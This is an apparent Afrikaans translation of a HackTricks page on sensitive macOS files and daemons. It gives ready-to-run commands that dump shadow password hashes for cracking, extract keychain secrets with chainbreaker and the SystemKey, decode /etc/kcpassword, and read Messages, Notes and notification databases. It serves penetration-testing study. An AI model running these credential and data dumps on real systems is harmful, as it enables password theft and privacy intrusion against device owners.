# macOS Sensitiewe Liggings & Interessante Daemons

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Wagwoorde

### Skadu-wagwoorde

Skadu-wagwoord word saam met die gebruiker se konfigurasie gestoor in pliste wat geleë is in **`/var/db/dslocal/nodes/Default/users/`**.\
Die volgende eenlynige kode kan gebruik word om **alle inligting oor die gebruikers** (insluitend hasinligting) te dump:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skripte soos hierdie een**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) of [**hierdie een**](https://github.com/octomagon/davegrohl.git) kan gebruik word om die hash na **hashcat-formaat** te omskep.

'n Alternatiewe een-liner wat geloofsbriewe van alle nie-diensrekeninge in hashcat-formaat `-m 7100` (macOS PBKDF2-SHA512) sal dump: 

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Sleutelbos Dump

Let daarop dat wanneer die `security` binêre lêer gebruik word om die wagwoorde ontsluit te **dump**, verskeie versoek sal vra dat die gebruiker hierdie operasie toelaat.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Sleutelkettingdump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Gebaseer op hierdie kommentaar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) lyk dit asof hierdie gereedskap nie meer werk in Big Sur nie.
{% endhint %}

### Sleutelkettingdump Oorsig

'n Gereedskap genaamd **keychaindump** is ontwikkel om wagwoorde uit macOS-sleutelkettings te onttrek, maar dit het beperkings op nuwer macOS-weergawes soos Big Sur, soos aangedui in 'n [bespreking](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Die gebruik van **keychaindump** vereis dat die aanvaller toegang verkry en voorregte na **root** eskaleer. Die gereedskap maak gebruik van die feit dat die sleutelketting standaard oopgemaak word by gebruikersaanmelding vir gerief, wat toepassings in staat stel om dit te benader sonder om die gebruiker se wagwoord herhaaldelik te vereis. As 'n gebruiker egter kies om hul sleutelketting na elke gebruik te sluit, word **keychaindump** ondoeltreffend.

**Keychaindump** werk deur 'n spesifieke proses genaamd **securityd** te teiken, soos deur Apple beskryf as 'n daemon vir magtiging en kriptografiese operasies, wat noodsaaklik is vir die benadering van die sleutelketting. Die onttrekkingsproses behels die identifisering van 'n **Meester Sleutel** wat afgelei is van die gebruiker se aanmeldingswagwoord. Hierdie sleutel is noodsaaklik vir die lees van die sleutelketting lêer. Om die **Meester Sleutel** te vind, skandeer **keychaindump** die geheuehoop van **securityd** deur die `vmmap` bevel te gebruik, op soek na potensiële sleutels binne areas wat as `MALLOC_TINY` geïdentifiseer is. Die volgende bevel word gebruik om hierdie geheue-areas te ondersoek:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Na die identifisering van potensiële hoofsluitels, soek **keychaindump** deur die hoop vir 'n spesifieke patroon (`0x0000000000000018`) wat 'n kandidaat vir die hoofslutel aandui. Verdere stappe, insluitend deobfuscation, is nodig om hierdie sleutel te gebruik, soos uiteengesit in die bronkode van **keychaindump**. Analiste wat op hierdie gebied fokus, moet daarop let dat die noodsaaklike data vir die dekriptering van die sleutelketting binne die geheue van die **securityd**-proses gestoor word. 'n Voorbeeldopdrag om **keychaindump** uit te voer is:
```bash
sudo ./keychaindump
```
### kettingbreek

[**Kettingbreek**](https://github.com/n0fate/chainbreaker) kan gebruik word om die volgende tipes inligting op 'n OSX-sleutelbord op 'n forensies-klank manier te onttrek:

* Gehashde Sleutelbord wagwoord, geskik vir kraak met [hashcat](https://hashcat.net/hashcat/) of [John the Ripper](https://www.openwall.com/john/)
* Internetwagwoorde
* Generiese Wagwoorde
* Privaatsleutels
* Openbare Sleutels
* X509-sertifikate
* Veilige Notas
* Appleshare Wagwoorde

Met die sleutelbordontgrendelwagwoord, 'n meestersleutel verkry deur [volafox](https://github.com/n0fate/volafox) of [volatility](https://github.com/volatilityfoundation/volatility), of 'n ontgrendelingslêer soos SystemKey, sal Kettingbreek ook platte teks wagwoorde voorsien.

Sonner een van hierdie metodes om die Sleutelbord te ontsluit, sal Kettingbreek alle ander beskikbare inligting vertoon.

#### **Stort sleutelbord sleutels**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Stort sleutelbundel sleutels (met wagwoorde) met SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Stort sleutelhanger sleutels (met wagwoorde) deur die has te kraak**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Stort sleutelhanger sleutels (met wagwoorde) met geheue storting**

[Volg hierdie stappe](../#dumping-memory-with-osxpmem) om 'n **geheue storting** uit te voer
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump sleutelbos sleutels (met wagwoorde) deur die gebruikers wagwoord te gebruik**

As jy die gebruikers wagwoord ken, kan jy dit gebruik om **sleutelbose wat aan die gebruiker behoort te dump en te dekripteer**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Die **kcpassword** lêer is 'n lêer wat die **gebruiker se aanmeldingswagwoord** bevat, maar slegs as die stelsel eienaar **outomatiese aanmelding geaktiveer** het. Daarom sal die gebruiker outomaties aangemeld word sonder om vir 'n wagwoord gevra te word (wat nie baie veilig is nie).

Die wagwoord word gestoor in die lêer **`/etc/kcpassword`** xored met die sleutel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. As die gebruikerswagwoord langer is as die sleutel, sal die sleutel hergebruik word.\
Dit maak die wagwoord redelik maklik om te herwin, byvoorbeeld deur skripte soos [**hierdie een**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Inligting in Databasisse

### Boodskappe
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Kennisgewings

Jy kan die Kennisgewingsdata vind in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Die meeste van die interessante inligting sal in die **blob** wees. Jy sal dus die inhoud moet **ontgin** en dit na **mensleesbare** formaat moet **omskep** of **`strings`** gebruik. Om toegang daartoe te kry, kan jy doen:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notas

Die gebruikers se **notas** kan gevind word in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Voorkeure

In macOS-toepassingsvoorkeure is geleë in **`$HOME/Library/Preferences`** en in iOS is hulle in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

In macOS kan die opdraggereelwerktuig **`defaults`** gebruik word om die Voorkeure-lêer te **wijzig**.

**`/usr/sbin/cfprefsd`** eis die XPC-diens `com.apple.cfprefsd.daemon` en `com.apple.cfprefsd.agent` op en kan geroep word om aksies soos die wysiging van voorkeure uit te voer.

## Stelselkennisgewings

### Darwin Kennisgewings

Die hoofdaemon vir kennisgewings is **`/usr/sbin/notifyd`**. Om kennisgewings te ontvang, moet kliënte registreer deur die `com.apple.system.notification_center` Mach-poort (kontroleer hulle met `sudo lsmp -p <pid notifyd>`). Die daemon is konfigureerbaar met die lêer `/etc/notify.conf`.

Die name wat vir kennisgewings gebruik word, is unieke omgekeerde DNS-notasies en wanneer 'n kennisgewing na een van hulle gestuur word, sal die kliënt(e) wat aangedui het dat hulle dit kan hanteer, dit ontvang.

Dit is moontlik om die huidige status te dump (en al die name te sien) deur die sein SIGUSR2 na die notifyd-proses te stuur en die gegenereerde lêer te lees: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Verspreide Kennisgewingsentrum

Die **Verspreide Kennisgewingsentrum** waarvan die hoofbinêre lêer **`/usr/sbin/distnoted`** is, is nog 'n manier om kennisgewings te stuur. Dit stel sommige XPC-diens bloot en doen 'n paar kontroles om te probeer om kliënte te verifieer.

### Apple Stuur Kennisgewings (APN)

In hierdie geval kan aansoeke registreer vir **onderwerpe**. Die kliënt sal 'n token genereer deur Apple se bedieners te kontak deur **`apsd`**.\
Dan sal verskaffers ook 'n token gegenereer het en in staat wees om met Apple se bedieners te verbind om boodskappe na die kliënte te stuur. Hierdie boodskappe sal plaaslik ontvang word deur **`apsd`** wat die kennisgewing na die wagtende aansoek sal deurgee.

Die voorkeure is geleë in `/Library/Preferences/com.apple.apsd.plist`.

Daar is 'n plaaslike databasis van boodskappe geleë in macOS in `/Library/Application\ Support/ApplePushService/aps.db` en in iOS in `/var/mobile/Library/ApplePushService`. Dit het 3 tabelle: `incoming_messages`, `outgoing_messages` en `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Dit is ook moontlik om inligting oor die duiwel en verbindings te kry deur die volgende te gebruik:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Gebruikerskennisgewings

Dit is kennisgewings wat die gebruiker op die skerm moet sien:

- **`CFUserNotification`**: Hierdie API bied 'n manier om 'n pop-up met 'n boodskap op die skerm te wys.
- **Die Bulletinbord**: Dit wys in iOS 'n banier wat verdwyn en in die Kennisgewingsentrum gestoor sal word.
- **`NSUserNotificationCenter`**: Dit is die iOS-bulletinbord in MacOS. Die databasis met die kennisgewings is geleë in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
